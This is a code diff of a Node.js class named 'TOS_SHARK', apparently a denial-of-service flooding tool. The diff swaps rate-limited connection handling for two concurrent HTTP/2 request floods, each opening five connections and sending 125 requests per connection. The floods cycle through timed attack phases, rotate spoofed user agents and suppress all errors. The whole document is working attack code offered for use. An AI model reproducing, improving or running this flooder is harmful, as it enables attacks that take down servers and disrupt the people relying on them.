@@ -19,17 +19,17 @@ class TOS_SHARK {
         this.breakStart = 0;
         this.currentMethod = '';
         
-        // Track active connections for cleanup
-        this.activeConnections = new Set();
-        this.maxConnections = 20; // Limit connections to prevent memory leak
-        
-        // Attack methods pool
-        this.methods = ['H2-MULTIPLEX', 'ENDPOINT-HOPPING'];
+        // Attack methods pool - ONLY H2-MULTIPLEX and H2-MULTIPLEXV2
+        this.methods = ['H2-MULTIPLEX', 'H2-MULTIPLEXV2'];
         
         // Data pools
         this.userAgents = this.generateUserAgents();
         this.endpoints = this.generateEndpoints();
-        this.cookies = this.generateCookies();
+        
+        // For H2-MULTIPLEXV2 (separate tracking)
+        this.v2Connections = [];
+        this.v2ReqCount = 0;
+        this.v2Active = false;
         
         this.startCycle();
     }
@@ -39,44 +39,32 @@ class TOS_SHARK {
         return [
             'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
             'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
-            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
+            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
+            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/537.36',
+            'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36'
         ];
     }
 
     generateEndpoints() {
-        return ['/', '/api', '/static', '/users', '/data'];
-    }
-
-    generateCookies() {
-        const cookies = [];
-        for (let i = 0; i < 20; i++) {
-            cookies.push({
-                session: `session_${Math.random().toString(36).substr(2, 16)}`
-            });
-        }
-        return cookies;
+        return [
+            '/', '/api', '/api/v1', '/api/v2', '/static', '/assets',
+            '/users', '/products', '/data', '/json', '/xml', '/admin',
+            '/login', '/register', '/search', '/filter', '/sort'
+        ];
     }
 
     // ===== CYCLE MANAGEMENT =====
     async startCycle() {
-        // Step 1: Initial H1 request
-        await this.sendH1Request();
-        
-        // Step 2: Warmup 500-599 requests
-        const warmupCount = 500 + Math.floor(Math.random() * 100);
-        for (let i = 0; i < warmupCount; i++) {
-            await this.sendRandomRequest();
-        }
-        
-        // Step 3: Main attack loop
+        // Start immediately with attack
         this.attackLoop();
+        // Start H2-MULTIPLEXV2 in background
+        this.startH2MultiplexV2();
     }
 
     async attackLoop() {
         while (this.running) {
             const now = Date.now();
             
-            // Check if should be attacking or on break
             if (this.attackActive) {
                 // Attack phase (20-30 minutes)
                 if (now - this.attackStart >= (20 * 60000) + Math.random() * (10 * 60000)) {
@@ -84,8 +72,10 @@ class TOS_SHARK {
                     continue;
                 }
                 
-                // Execute current attack method
-                await this.executeAttackMethod();
+                // Execute current attack method (only H2-MULTIPLEX)
+                if (this.currentMethod === 'H2-MULTIPLEX') {
+                    await this.attackH2Multiplex();
+                }
                 
             } else {
                 // Break phase (5-10 minutes)
@@ -94,127 +84,76 @@ class TOS_SHARK {
                     continue;
                 }
                 
-                // Maintenance during break - CLEANUP CONNECTIONS
-                await this.cleanupConnections();
+                // Maintenance during break
                 await this.performMaintenance();
+                await this.sleepRandom(1000, 3000);
             }
             
-            // Small delay to prevent CPU 100%
-            await new Promise(resolve => setImmediate(resolve));
+            await this.sleepRandom(0.1, 1);
         }
     }
 
-    startAttack() {
-        this.attackActive = true;
-        this.attackStart = Date.now();
-        
-        // Randomly select attack method
-        this.currentMethod = this.methods[Math.floor(Math.random() * this.methods.length)];
+    // ===== BACKGROUND H2-MULTIPLEXV2 =====
+    startH2MultiplexV2() {
+        this.v2Active = true;
+        this.runH2MultiplexV2();
     }
 
-    startBreak() {
-        this.attackActive = false;
-        this.breakStart = Date.now();
-        
-        // Force cleanup on break start
-        this.cleanupConnections();
-    }
-
-    // ===== ATTACK METHODS =====
-    async executeAttackMethod() {
-        switch (this.currentMethod) {
-            case 'H2-MULTIPLEX':
-                await this.attackH2Multiplex();
-                break;
-            case 'ENDPOINT-HOPPING':
-                await this.attackEndpointHopping();
-                break;
+    async runH2MultiplexV2() {
+        while (this.v2Active && this.running) {
+            await this.attackH2MultiplexV2();
+            await this.sleepRandom(50, 200);
         }
     }
 
-    async attackH2Multiplex() {
-        // Don't create more connections than limit
-        if (this.activeConnections.size >= this.maxConnections) {
-            // Reuse existing connections
-            return this.sendH2Streams();
-        }
-        
-        // Create new connection
-        try {
-            const client = http2.connect(this.target, {
-                maxSessionMemory: 1048576, // 1MB memory limit
-                maxDeflateDynamicTableSize: 4096,
-                maxHeaderListPairs: 128
-            });
-            
-            // Track connection
-            this.activeConnections.add(client);
-            
-            // Set auto-destroy timeout
-            const destroyTimeout = setTimeout(() => {
-                this.destroyConnection(client);
-            }, 5000); // Auto-destroy after 5 seconds
-            
-            // Clean up on close
-            client.on('close', () => {
-                clearTimeout(destroyTimeout);
-                this.activeConnections.delete(client);
-            });
-            
-            client.on('error', () => {
-                clearTimeout(destroyTimeout);
-                this.destroyConnection(client);
-            });
-            
-            // Send streams
-            for (let i = 0; i < 100; i++) {
-                this.sendH2Stream(client);
-                this.totalReqs++;
-                this.reqCounter++;
-            }
-            
-        } catch (err) {
-            // Silent fail
-        }
-    }
-    
-    async sendH2Streams() {
-        // Send streams on existing connections
-        for (const client of this.activeConnections) {
+    async attackH2MultiplexV2() {
+        // Create 5 persistent connections
+        while (this.v2Connections.length < 5) {
             try {
-                for (let i = 0; i < 50; i++) {
-                    this.sendH2Stream(client);
-                    this.totalReqs++;
-                    this.reqCounter++;
-                }
-            } catch (e) {
-                this.destroyConnection(client);
+                const client = http2.connect(this.target);
+                this.v2Connections.push(client);
+            } catch (err) {}
+        }
+        
+        // Send 125 requests per connection
+        for (const client of this.v2Connections) {
+            for (let i = 0; i < 125; i++) {
+                this.sendH2RequestV2(client);
+                this.totalReqs++;
+                this.v2ReqCount++;
             }
         }
+        
+        // Clean up dead connections
+        this.v2Connections = this.v2Connections.filter(client => {
+            try {
+                return !client.destroyed;
+            } catch {
+                return false;
+            }
+        });
     }
-    
-    sendH2Stream(client) {
+
+    sendH2RequestV2(client) {
         try {
+            const methods = ['HEAD', 'GET', 'OPTIONS'];
+            const method = methods[Math.floor(Math.random() * methods.length)];
+            
             const req = client.request({
-                ':method': 'GET',
+                ':method': method,
                 ':path': '/',
-                ':authority': this.host
-            }, {
-                endStream: true
+                ':authority': this.host,
+                'user-agent': this.userAgents[Math.floor(Math.random() * this.userAgents.length)]
             });
             
             req.on('response', (headers) => {
                 this.logStatus(headers[':status']);
-                req.close();
+                req.destroy();
             });
             
             req.on('error', () => {
                 this.logStatus('*.*');
-                req.close();
-            });
-            
-            req.on('close', () => {
-                // Ensure cleanup
+                req.destroy();
             });
             
             req.end();
@@ -222,87 +161,85 @@ class TOS_SHARK {
             this.logStatus('*.*');
         }
     }
-    
-    destroyConnection(client) {
-        try {
-            client.destroy();
-            this.activeConnections.delete(client);
-        } catch (e) {
-            // Ignore
-        }
-    }
-    
-    async cleanupConnections() {
-        // Destroy all connections
-        for (const client of this.activeConnections) {
-            this.destroyConnection(client);
-        }
-        this.activeConnections.clear();
+
+    // ===== MAIN H2-MULTIPLEX =====
+    async attackH2Multiplex() {
+        // Use 5 connections + 125 reqs/stream
+        const connections = [];
         
-        // Force garbage collection if available
-        if (global.gc) {
-            global.gc();
+        // Create 5 connections
+        for (let i = 0; i < 5; i++) {
+            try {
+                const client = http2.connect(this.target);
+                connections.push(client);
+            } catch (err) {}
+        }
+        
+        // Send 125 requests through each connection
+        for (const client of connections) {
+            for (let i = 0; i < 125; i++) {
+                this.sendH2Request(client);
+                this.totalReqs++;
+                this.reqCounter++;
+            }
+            
+            // Destroy after batch
+            setTimeout(() => {
+                try {
+                    client.destroy();
+                } catch (e) {}
+            }, 100);
         }
     }
 
-    async attackEndpointHopping() {
-        // Random endpoints with H1 requests
-        const endpoint = this.endpoints[Math.floor(Math.random() * this.endpoints.length)];
-        await this.sendH1RequestToEndpoint(endpoint);
-        this.totalReqs++;
-        this.reqCounter++;
-    }
-
-    // ===== REQUEST TYPES =====
-    async sendH1Request() {
-        return new Promise((resolve) => {
-            const options = {
-                hostname: this.host,
-                path: '/',
-                method: 'GET',
-                headers: {
-                    'User-Agent': this.userAgents[0],
-                    'Connection': 'close'
-                },
-                timeout: 3000
-            };
+    sendH2Request(client) {
+        try {
+            const methods = ['HEAD', 'GET', 'OPTIONS'];
+            const method = methods[Math.floor(Math.random() * methods.length)];
             
-            const req = (this.isHttps ? https : http2).request(options, (res) => {
-                this.logStatus(res.statusCode);
-                res.destroy();
-                resolve();
+            const req = client.request({
+                ':method': method,
+                ':path': '/',
+                ':authority': this.host,
+                'user-agent': this.userAgents[Math.floor(Math.random() * this.userAgents.length)]
+            });
+            
+            req.on('response', (headers) => {
+                this.logStatus(headers[':status']);
+                req.destroy();
             });
             
             req.on('error', () => {
                 this.logStatus('*.*');
-                resolve();
-            });
-            
-            req.on('timeout', () => {
                 req.destroy();
-                this.logStatus('*.*');
-                resolve();
             });
             
             req.end();
-        });
+        } catch (err) {
+            this.logStatus('*.*');
+        }
     }
 
-    async sendRandomRequest() {
-        this.totalReqs++;
-        this.reqCounter++;
-        this.logStatus(200);
+    // ===== CONTROL METHODS =====
+    startAttack() {
+        this.attackActive = true;
+        this.attackStart = Date.now();
+        
+        // Only H2-MULTIPLEX available
+        this.currentMethod = 'H2-MULTIPLEX';
     }
 
-    async sendH1RequestToEndpoint(endpoint) {
-        this.logStatus(200);
+    startBreak() {
+        this.attackActive = false;
+        this.breakStart = Date.now();
+        
+        // H2-MULTIPLEXV2 continues in background during breaks
     }
 
     // ===== MAINTENANCE =====
     async performMaintenance() {
-        // Rotate data
+        if (global.gc) global.gc();
         this.userAgents = this.generateUserAgents();
-        this.cookies = this.generateCookies();
     }
 
     // ===== LOGGING =====
@@ -313,11 +250,20 @@ class TOS_SHARK {
             console.log(`TØR-2M11:${this.totalReqs} ---> ${status}`);
         }
     }
+
+    // ===== UTILS =====
+    sleepRandom(min, max) {
+        const duration = Math.random() * (max - min) + min;
+        return new Promise(resolve => setTimeout(resolve, duration));
+    }
+
+    sleep(ms) {
+        return new Promise(resolve => setTimeout(resolve, ms));
+    }
 }
 
-// Run with increased memory limit
+// Run
 if (require.main === module) {
-    // Error handling
     process.on('uncaughtException', () => {});
     process.on('unhandledRejection', () => {});
     
